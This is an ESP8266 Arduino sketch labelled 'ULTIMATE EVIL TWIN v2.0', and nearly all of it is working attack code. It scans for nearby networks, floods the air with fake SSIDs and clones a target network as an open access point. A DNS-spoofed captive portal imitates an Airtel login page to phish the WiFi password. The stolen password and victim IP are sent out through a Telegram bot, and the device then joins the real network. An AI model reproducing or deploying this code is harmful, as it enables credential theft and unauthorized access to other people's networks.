#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

const char* BOT_TOKEN = "8560004612:AAGG8sNRtXk_vUdTe5lRhT5ndTBAl_JMmhY";  // Replace karo
const char* CHAT_ID = "8560004612";     // Replace karo

const int LED_PIN = 2;  // D4 LED
DNSServer dnsServer;
ESP8266WebServer server(80);

String targetSSID = "";
String targetPass = "";
String victimIP = "";
bool hasPassword = false;
bool connectedToNet = false;
int fakeCount = 0;

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  Serial.println("🔥 ULTIMATE EVIL TWIN v2.0");
  
  // STEP 1: Scan + Select Target
  scanTarget();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if (hasPassword && !connectedToNet) {
    connectToRealWiFi();
  }
  
  delay(10);
}

void scanTarget() {
  Serial.println("📡 Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(1000);
  
  int n = WiFi.scanNetworks();
  Serial.printf("Found %d APs\n", n);
  
  int maxLen = 0;
  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    Serial.printf("  %s (%d chars)\n", ssid.c_str(), len);
    
    if (len > maxLen && len > 10 && !ssid.startsWith("ESP")) {
      maxLen = len;
      targetSSID = ssid;
    }
  }
  
  WiFi.scanDelete();
  Serial.printf("🎯 TARGET: %s\n", targetSSID.c_str());
  
  // CHANGE 1: 20 Fake WiFi Flood + Deauth
  startFloodAndDeauth();
}

void startFloodAndDeauth() {
  Serial.println("🌪️ Creating 20 Fake SSIDs + Deauth...");
  
  // 20 Fake SSIDs (rapid channel hopping)
  for (int i = 0; i < 20; i++) {
    String fakeSSID = targetSSID.substring(0,8) + String(random(1000,9999));
    WiFi.mode(WIFI_AP);
    WiFi.softAP(fakeSSID.c_str(), "", random(1,14), 0, 4);
    delay(800);  // Quick switch
    fakeCount++;
    Serial.printf("Fake #%d: %s\n", fakeCount, fakeSSID.c_str());
  }
  
  // Main Evil Twin AP
  WiFi.softAP(targetSSID.c_str(), "", 6, 0, 8);
  Serial.println("📶 Main AP: " + targetSSID);
  
  // CHANGE 2: CAPTIVE PORTAL + DNS SPOOF
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Single click login (Auto-redirect)
  server.on("/", HTTP_GET, [](){
    Serial.println("👤 Victim: " + server.client().remoteIP().toString());
    victimIP = server.client().remoteIP().toString();
    showFakeLogin();
  });
  
  server.on("/login", HTTP_POST, capturePassword);
  server.on("/generate_204", HTTP_GET, showFakeLogin);  // Android captive
  server.on("/fwlink", HTTP_GET, showFakeLogin);        // iOS captive
  server.on("/style.css", sendCSS);
  server.on("/logo.png", sendLogo);
  
  server.begin();
  Serial.println("✅ READY! IP: " + WiFi.softAPIP().toString());
  
  blinkPattern(3, 200);  // Ready signal
}

void showFakeLogin() {
  String html = R"(
<!DOCTYPE html>
<html>
<head>
<meta name=viewport content=width=device-width>
<title>Airtel WiFi Captive Portal</title>
<link rel=stylesheet href=/style.css>
</head>
<body>
<div class=login>
<img src=/logo.png class=logo>
<h2>Airtel Xstream</h2>
<form action=/login method=POST>
<input type=text name=ssid value=)HTML_ESCAPE(targetSSID)HTML_ESCAPE( readonly>
<input type=password name=pass placeholder='WiFi Password' required>
<button>Connect</button>
</form>
<p>Secure Airtel Network</p>
</div>
</body>
</html>)";
  
  server.send(200, "text/html", html);
}

void capturePassword() {
  targetPass = server.arg("pass");
  hasPassword = true;
  
  Serial.printf("🎣 PASSWORD: %s\n", targetPass.c_str());
  Serial.printf("Victim IP: %s\n", victimIP.c_str());
  
  // CHANGE 3: Send via Telegram AFTER Internet connect
  blinkPattern(5, 150);  // Captured signal
  
  String msg = "🔥 CAPTURED!\nSSID: " + targetSSID + "\nPASS: " + targetPass + "\nVictim: " + victimIP;
  sendTelegram(msg);
}

void connectToRealWiFi() {
  Serial.println("📶 Connecting to real WiFi...");
  
  WiFi.mode(WIFI_STA);
  WiFi.begin(targetSSID.c_str(), targetPass.c_str());
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    connectedToNet = true;
    Serial.println("\n✅ INTERNET CONNECTED!");
    Serial.println("IP: " + WiFi.localIP().toString());
    
    // CHANGE 4: NOW send final confirmation
    sendTelegram("✅ CONFIRMED! Internet connected. All data safe.");
    blinkPattern(40, 120);  // FINAL 40 BLINKS!
  }
}

void sendTelegram(String msg) {
  if (WiFi.status() == WL_CONNECTED) {
    WiFiClientSecure client;
    HTTPClient http;
    http.begin(client, "https://api.telegram.org/bot" + String(BOT_TOKEN) + 
               "/sendMessage?chat_id=" + String(CHAT_ID) + "&text=" + urlEncode(msg));
    http.POST("");
    http.end();
    Serial.println("📱 Telegram OK");
  }
}

void blinkPattern(int times, int delayMs) {
  for(int i = 0; i < times; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(delayMs);
    digitalWrite(LED_PIN, HIGH);
    delay(delayMs);
  }
}

void sendCSS() {
  server.send(200, "text/css", R"(body{margin:0;height:100vh;background:linear-gradient(135deg,#ff6b35,#f7931e);display:flex;align-items:center;justify-content:center;font-family:Arial}
.login{background:white;padding:40px;border-radius:20px;box-shadow:0 15px 35px rgba(0,0,0,.3);text-align:center;max-width:350px}
.logo{width:80px;margin-bottom:20px}
h2{color:#333;margin:20px 0;font-size:24px}
input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:10px;box-sizing:border-box;font-size:16px}
input[readonly]{background:#f0f0f0}
button{width:100%;padding:15px;background:#00a651;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer}
p{color:#666;font-size:14px})");
}

void sendLogo() {
  server.send(200, "image/svg+xml", R"(<svg width=80 height=80 viewBox='0 0 80 80'><circle cx=40 cy=40 r=38 fill='#FF6B35'/><text x=40 y=45 font-family=Arial font-size=16 fill=white font-weight=bold text-anchor=middle>AIRTEL</text><text x=40 y=58 font-size=10 fill='rgba(255,255,255,.8)' text-anchor=middle>Xstream</text></svg>)");
}

String urlEncode(String s) {
  String enc = "";
  for(unsigned i=0; i<s.length(); i++) {
    char c = s[i];
    if(isAlphaNumeric(c)) enc += c;
    else enc += '%' + String((uint8_t)c>>4,HEX) + String((uint8_t)c&0xF,HEX);
  }
  return enc;
}
